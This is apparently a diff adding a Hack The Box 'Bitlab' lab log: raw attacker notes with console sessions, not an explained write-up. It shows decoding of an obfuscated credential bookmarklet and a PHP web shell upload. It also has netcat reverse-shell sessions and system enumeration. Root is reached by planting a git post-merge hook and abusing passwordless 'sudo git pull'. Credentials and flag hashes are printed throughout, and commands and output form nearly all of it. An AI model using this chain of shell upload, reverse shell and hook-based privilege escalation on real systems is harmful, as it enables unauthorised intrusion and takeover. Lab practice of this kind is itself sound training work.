@@ -1,0 +1,278 @@
+
+view-source:http://10.10.10.114/help/bookmarks.html
+
+javascript:(function(){%20var%20_0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]=%20_0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]=%20_0x4b18[5];%20})()
+root@kali:~/HTB/Bitlab# python3
+Python 3.7.3 (default, Apr  3 2019, 05:39:12) 
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> a = ["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"]
+>>> print(a)
+['value', 'user_login', 'getElementById', 'clave', 'user_password', '11des0081x']
+
+upload shell to admin /profile
+and goto /profile/shell.php
+
+root@kali:~/HTB/Bitlab# nc -lvp 1337
+listening on [any] 1337 ...
+10.10.10.114: inverse host lookup failed: Unknown host
+connect to [10.10.16.62] from (UNKNOWN) [10.10.10.114] 55104
+Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 17:39:44 up  2:20,  0 users,  load average: 8.21, 9.35, 8.68
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
+$ sudo -l
+Matching Defaults entries for www-data on bitlab:
+    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bitlab:
+    (root) NOPASSWD: /usr/bin/git pull
+$ 
+
+
+$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+$ ifconfig
+br-c8b1f0816703: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
+        inet6 fe80::42:3bff:fe16:8891  prefixlen 64  scopeid 0x20<link>
+        ether 02:42:3b:16:88:91  txqueuelen 0  (Ethernet)
+        RX packets 416861  bytes 345407910 (345.4 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 424746  bytes 207735877 (207.7 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:52:8a:5c:17  txqueuelen 0  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.114  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 fe80::250:56ff:feb9:a50b  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::250:56ff:feb9:a50b  prefixlen 64  scopeid 0x0<global>
+        ether 00:50:56:b9:a5:0b  txqueuelen 1000  (Ethernet)
+        RX packets 722514  bytes 61125937 (61.1 MB)
+        RX errors 0  dropped 7  overruns 0  frame 0
+        TX packets 220632  bytes 183284298 (183.2 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 515  bytes 85882 (85.8 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 515  bytes 85882 (85.8 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+veth170ec32: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::8cc9:eeff:fe7d:80a8  prefixlen 64  scopeid 0x20<link>
+        ether 8e:c9:ee:7d:80:a8  txqueuelen 0  (Ethernet)
+        RX packets 312311  bytes 294430900 (294.4 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 382220  bytes 245829172 (245.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+vethb26f36a: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::54d8:15ff:feb3:4094  prefixlen 64  scopeid 0x20<link>
+        ether 56:d8:15:b3:40:94  txqueuelen 0  (Ethernet)
+        RX packets 142954  bytes 130906504 (130.9 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 186653  bytes 49121480 (49.1 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+vethc67c547: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::246d:8ff:fe12:89ee  prefixlen 64  scopeid 0x20<link>
+        ether 26:6d:08:12:89:ee  txqueuelen 0  (Ethernet)
+        RX packets 302771  bytes 187199486 (187.1 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 292747  bytes 190139992 (190.1 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+vethd019258: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::a036:4eff:fe45:b762  prefixlen 64  scopeid 0x20<link>
+        ether a2:36:4e:45:b7:62  txqueuelen 0  (Ethernet)
+        RX packets 682892  bytes 458990148 (458.9 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 587300  bytes 442935837 (442.9 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+$ 
+$ uname -a
+Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+$ 
+$ find / -perm -u=s -type f 2>/dev/null
+/sbin/mount.nfs
+/sbin/mount.cifs
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/at
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/chsh
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/su
+
+root       852  0.0  0.0  31320   264 ?        Ss   17:42   0:00 /usr/sbin/cron -f
+root       858  0.0  0.0 170436   484 ?        Ssl  17:42   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root       859  0.0  0.0 287544    80 ?        Ssl  17:42   0:00 /usr/lib/accountsservice/accounts-daemon
+root       860  0.5  0.0 653016   840 ?        Ssl  17:42   0:16 /usr/bin/lxcfs /var/lib/lxcfs/
+root       878  0.0  0.0 288880  1068 ?        Ssl  17:42   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root      1074  0.0  0.0  72296   936 ?        Ss   17:42   0:00 /usr/sbin/sshd -D
+root      1081  0.0  0.2 793776  5752 ?        Ssl  17:42   0:01 /usr/bin/containerd
+root      1082  0.1  0.4 896096 10172 ?        Ssl  17:42   0:03 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root      1084  0.0  0.0  16180    20 tty1     Ss+  17:42   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root      1103  0.0  0.0 378988  1716 ?        Ss   17:42   0:00 /usr/sbin/apache2 -k start
+root      1457  0.0  0.0 405508    44 ?        Sl   17:42   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.19.0.2 -container-port 80
+root      1468  0.0  0.0 479240     0 ?        Sl   17:42   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5432 -container-ip 172.19.0.4 -container-port 5432
+root      1476  0.0  0.0 108756   580 ?        Sl   17:42   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/30a30dd26e1a78dfab687334bd7b40c80c8f447e023cd31ab153ad82316a326f -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
+root      1490  0.7  0.1 554508  3360 ?        Sl   17:42   0:22 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 3000 -container-ip 172.19.0.5 -container-port 80
+root      1504  0.0  0.0 479240   140 ?        Sl   17:42   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3022 -container-ip 172.19.0.5 -container-port 22
+root      1517  0.0  0.0 108756   624 ?        Sl   17:42   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/c851f502752e7b9e32aa79a97ddb4e02dc75b181142683b77ea428c8671c1da7 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
+root      1525  0.0  0.0 108756   372 ?        Sl   17:42   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/9d5b91477bb2aaac5d875bed9449e4003daf0383e2c853ff6006a0c85e0fdaff -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
+root      1528  0.0  0.0 108756   412 ?        Sl   17:42   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/d7c134ae256fc07b0c8302babf079d0e8a37a6aac8d90e650a528d261ae5ac44 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
+root      1624  0.0  0.0  37360   740 ?        Ss   17:42   0:00 haproxy -W -db -f /usr/local/etc/haproxy/haproxy.cfg
+root      1636  0.8  0.1  56176  2756 ?        Ss   17:42   0:26 /usr/bin/python /usr/bin/supervisord -nc /etc/supervisor/supervisord.conf
+root      1913  0.0  0.0 105684   408 ?        Ss   17:42   0:00 sshd: clave [priv]
+root      1921  2.0  0.1  41036  4044 ?        R    17:42   1:03 haproxy -W -db -f /usr/local/etc/haproxy/haproxy.cfg
+root      5399  0.0  0.0 105684   412 ?        Ss   17:43   0:00 sshd: clave [priv]
+root      5502  0.0  0.0  26068   168 ?        S    17:43   0:00 /usr/sbin/cron -f
+root      5503  0.0  0.0 150240   684 ?        S    17:43   0:00 nginx: master process /usr/sbin/nginx -g daemon off;
+root      5507  0.0  0.0  65512   576 ?        S    17:43   0:00 /usr/sbin/sshd -D -E /var/log/gitlab/supervisor/sshd.log
+root     11525  0.0  0.0      0     0 ?        I    18:04   0:00 [kworker/0:2]
+root     11565  0.0  0.0      0     0 ?        I    18:04   0:00 [kworker/u2:0]
+root     18781  0.0  0.0      0     0 ?        I    18:21   0:00 [kworker/u2:1]
+root     24880  1.0  0.3 107996  6740 ?        Ss   18:33   0:00 sshd: unknown [priv]
+www-data 24897  0.0  0.0  11464   924 ?        S    18:33   0:00 grep root
+$ 
+$ pwd
+/home/clave
+$ ls -a
+.
+..
+.bash_history
+.bashrc
+.cache
+.gnupg
+.profile
+.ssh
+RemoteConnection.exe
+user.txt
+
+
+from bitlab.htb/dashboard/snippets
+
+<?php
+$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
+$result = pg_query($db_connection, "SELECT * FROM profiles");
+
+--
+
+Use teh above to dump db on the box
+
+user: clave
+pass: c3NoLXN0cjBuZy1wQHNz==
+
+root@kali:~/Downloads# ssh clave@bitlab.htb
+The authenticity of host 'bitlab.htb (10.10.10.114)' can't be established.
+ECDSA key fingerprint is SHA256:hNHxoptKsWqkzdME7Bfb+cGjskcAAGySJazK+gDDCHQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'bitlab.htb,10.10.10.114' (ECDSA) to the list of known hosts.
+clave@bitlab.htb's password: 
+Permission denied, please try again.
+clave@bitlab.htb's password: 
+Last login: Wed Sep 11 19:19:22 2019 from 10.10.16.2
+clave@bitlab:~$ ls -a
+.  ..  .bash_history  .bashrc  .cache  .gnupg  .profile  RemoteConnection.exe  user.txt
+clave@bitlab:~$ cat user.txt
+1e3fd81ec3aa2f1462370ee3c20b8154
+clave@bitlab:~$ 
+
+
+https://www.liquidlight.co.uk/blog/using-a-post-merge-git-hook-to-clean-up-old-branches/
+
+root@kali:~/HTB/Bitlab# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.62] from bitlab.htb [10.10.10.114] 41098
+Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 13:57:41 up 7 min,  1 user,  load average: 4.31, 3.04, 1.49
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+clave    pts/0    10.10.12.64      13:50   45.00s  0.04s  0.00s ./socat TCP4-LISTEN:9001,reuseaddr,fork TCP4:127.0.0.0:5432
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash");'
+www-data@bitlab:/$ cd tmp
+cd tmp
+www-data@bitlab:/tmp$ mkdir fuckoff
+mkdir fuckoff
+www-data@bitlab:/tmp$ cd fuckoff
+cd fuckoff
+www-data@bitlab:/tmp/fuckoff$ git clone /var/www/html/profile
+git clone /var/www/html/profile
+Cloning into 'profile'...
+done.
+www-data@bitlab:/tmp/fuckoff$ echo "cp /root/root.txt /tmp/fuckoff/hello; chmod 777 /tmp/fuckoff/hello" > .git/hooks/post-merge
+<mod 777 /tmp/fuckoff/hello" > .git/hooks/post-merge
+bash: .git/hooks/post-merge: No such file or directory
+www-data@bitlab:/tmp/fuckoff$ ls -a 
+ls -a
+.  ..  profile
+www-data@bitlab:/tmp/fuckoff$ cd profile
+cd profile
+www-data@bitlab:/tmp/fuckoff/profile$ echo "cp /root/root.txt /tmp/fuckoff/hello; chmod 777 /tmp/fuckoff/hello" > .git/hooks/post-merge
+<mod 777 /tmp/fuckoff/hello" > .git/hooks/post-merge
+www-data@bitlab:/tmp/fuckoff/profile$ chmod u+x .git/hooks/post-merge
+chmod u+x .git/hooks/post-merge
+www-data@bitlab:/tmp/fuckoff/profile$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on bitlab:
+    env_reset, exempt_group=sudo, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bitlab:
+    (root) NOPASSWD: /usr/bin/git pull
+www-data@bitlab:/tmp/fuckoff/profile$ sudo -u root /usr/bin/git pull
+sudo -u root /usr/bin/git pull
+remote: Counting objects: 9, done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 9 (delta 5), reused 0 (delta 0)
+Unpacking objects: 100% (9/9), done.
+From /var/www/html/profile
+   411f4ec..a5667cc  master     -> origin/master
+Updating 411f4ec..a5667cc
+Fast-forward
+ asd.php      | 411 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ webshell.php | 192 ++++++++++++++++++++++++++++
+ 2 files changed, 603 insertions(+)
+ create mode 100644 asd.php
+ create mode 100644 webshell.php
+www-data@bitlab:/tmp/fuckoff/profile$ ls -a /tmp/fuckoff
+ls -a /tmp/fuckoff
+.  ..  hello  profile
+www-data@bitlab:/tmp/fuckoff/profile$ cat /tmp/fuckoff/hello
+cat /tmp/fuckoff/hello
+8d4cc131757957cb68d9a0cddccd587c
+www-data@bitlab:/tmp/fuckoff/profile$ 
+
